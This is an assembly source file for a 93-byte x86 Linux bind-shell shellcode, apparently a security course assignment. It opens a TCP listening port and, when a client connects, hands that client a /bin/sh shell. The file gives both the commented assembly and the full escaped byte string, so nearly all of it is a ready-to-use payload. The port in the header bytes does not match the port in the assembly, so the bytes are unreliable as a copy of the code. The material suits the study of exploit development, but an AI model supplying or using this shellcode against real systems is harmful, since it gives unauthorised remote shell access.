;Description:	Assignment #1 (Shell_Bind_TCP, 93 bytes)
;Shellcode:		\x31\xd2\x31\xdb\x6a\x66\x58\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\xb0\x66\x43\x52\x66\x68\x90\x34\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80
;Author: 		Paolo Stivanin <https://github.com/polslinux>
;SLAE ID:		526

global _start
section .text
_start:
	;socket(): sys_socketcall(int call, unsigned long *args)
	;eax -> sys_socketcall
	;ebx -> SYS_{SOCKET(1),BIND(2),CONNECT(3),LISTEN(4),ACCEPT(5) /usr/include/linux/net.h}
	;ecx -> args(AF_INET{/usr/include/bits/socket.h -> 2}, SOCK_STREAM{/usr/include/bits/socket_type.h -> 1}, 0)
	xor edx,edx
	xor ebx,ebx
	push BYTE 0x66 	;sys_socketcall
	pop eax
	inc ebx			;SYS_SOCKET
	push edx		;0
	push BYTE 1 	;SOCK_STREAM
	push BYTE 2		;AF_INET
	mov ecx,esp
	int 0x80
	xchg esi,eax

	;bind(): sys_socketcall(int call, unsigned long *args)
	;eax -> sys_socketcall
	;ebx -> SYS_BIND
	;ecx -> args(sockfd{esi}, {sa_family{2},sin_port{7500},sin_addr{0.0.0.0}}, socklen_t addrlen{16 bytes})
	mov BYTE al,0x66
	inc ebx			;SYS_BIND
	push edx
	push WORD 0x4C1D; por 7500
	push bx
	mov ecx,esp
	push BYTE 16
	push ecx
	push esi
	mov ecx,esp
	int 0x80

	;listen(): sys_socketcall(int call, unsigned long *args)
	;eax -> sys_socketcall
	;ebx -> SYS_LISTEN
	;ecx -> args(sockfd, backlog)
	mov BYTE al,0x66
	inc ebx
	inc ebx			;SYS_LISTEN
	push BYTE 1
	push esi
	mov ecx,esp
	int 0x80

	;accept: sys_socketcall(int call, unsigned long *args)
	;eax -> sys_socketcall
	;ebx -> SYS_ACCEPT
	;ecx -> args(sockfd, NULL, NULL)
	mov BYTE al,0x66
	inc ebx			;SYS_ACCEPT
	push edx
	push edx
	push esi
	mov ecx,esp
	int 0x80

	;dup2 sys_dup2(oldfd, newfd{0[stdin],1[stdout],2[stderr]})
	xchg ebx,eax
	push BYTE 2
	pop ecx
lp:	mov BYTE al,0x3f
	int 0x80
	dec ecx
	jns lp			;SF=0 positive, SF=1 negative. JNS (jump-if-not-sign) will loop while SF=0. When SF is set we reach a negative value so the loop stops.		
	
	;execve /bin/sh
	mov BYTE al,11
	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	push edx
	mov edx,esp
	push ebx
	mov ecx,esp
	int 0x80
